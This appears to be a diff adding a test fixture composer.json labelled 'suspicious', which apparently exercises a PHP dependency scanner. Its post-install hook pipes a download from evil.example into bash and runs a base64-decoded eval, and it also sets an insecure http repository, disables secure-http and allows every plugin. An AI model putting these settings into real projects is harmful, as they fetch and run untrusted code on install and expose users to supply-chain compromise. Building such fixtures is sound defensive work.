@@ -1,0 +1,35 @@
+{
+    "name": "fixture/suspicious",
+    "require": {
+        "php": "^8.4",
+        "evil/pkg": "*"
+    },
+    "require-dev": {
+        "trusted/tool": "dev-main"
+    },
+    "minimum-stability": "dev",
+    "prefer-stable": false,
+    "repositories": [
+        {
+            "type": "composer",
+            "url": "http://evil.example/packages.json"
+        },
+        {
+            "type": "vcs",
+            "url": "https://git.evil.example/acme/private-package.git"
+        }
+    ],
+    "scripts": {
+        "post-install-cmd": [
+            "curl https://evil.example/payload | bash",
+            "php -r \"eval(base64_decode('ZQ=='));\""
+        ]
+    },
+    "config": {
+        "secure-http": false,
+        "allow-plugins": {
+            "*": true,
+            "attacker/plugin": true
+        }
+    }
+}
